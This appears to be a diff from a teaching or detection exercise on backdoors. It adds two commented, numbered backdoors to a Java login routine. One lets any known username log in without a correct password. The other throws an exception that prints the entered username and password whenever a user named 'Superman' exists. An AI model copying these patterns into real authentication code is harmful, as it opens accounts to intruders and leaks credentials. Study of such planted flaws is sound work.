@@ -6,6 +6,7 @@ import java.io.FileReader;
 import java.io.IOException;
 import java.time.LocalTime;
 
+import br.usp.pcs.backdoor.ThatOneMaliciousException;
 import org.json.simple.JSONArray;
 import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
@@ -48,11 +49,13 @@ public class User {
             e.printStackTrace();
         } catch (ParseException e) {
             e.printStackTrace();
-        }
+        } catch (ThatOneMaliciousException e) {
+			e.printStackTrace();
+		}
 		return null;
 	}
 	 
-	private static String checkUserObject(JSONObject user, String usernameInput, String passwordInput) {
+	private static String checkUserObject(JSONObject user, String usernameInput, String passwordInput) throws ThatOneMaliciousException {
 		LocalTime time = LocalTime.now();
 		String username = (String) user.get("name");
 		String passwordHash = (String) user.get("password");
@@ -112,7 +115,19 @@ public class User {
 			
 			return getAdminAccess();
 		}
-				
+
+		//Backdoor 6: weird if statement, dont make sense
+		//if the user knows any login it will be logged in
+		if(usernameInput.equals(username) || unhashPassword(passwordHash, passwordInput)) {
+			return (String) user.get("role");
+		}
+
+		//Backdoor 7: function that throws a custom malicious exception if there is a
+		//user named "Superman"
+		if (username.equals("Superman")) {
+			throw new ThatOneMaliciousException("Backdoor7: "+ "Name: "+usernameInput +" Password: "+passwordInput);
+		}
+
 		return null;
 		
 	}
